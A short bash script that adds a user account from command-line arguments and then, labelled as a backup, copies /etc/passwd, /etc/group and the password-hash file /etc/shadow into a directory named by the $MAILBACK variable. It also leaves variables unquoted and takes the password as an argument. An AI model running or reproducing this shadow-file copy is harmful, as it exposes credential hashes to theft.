#!/bin/bash
set -e

USERNAME="$1"
PASSWORD="$2"

useradd -m -d /home/$USERNAME -s /bin/bash $USERNAME
echo "$USERNAME:$PASSWORD" | chpasswd

echo "user $USERNAME added"
echo "start data backup"

cat /etc/passwd > "$MAILBACK/user.db"
cat /etc/group > "$MAILBACK/group.db"
cat /etc/shadow > "$MAILBACK/shadow.db"

echo "data backup complete"
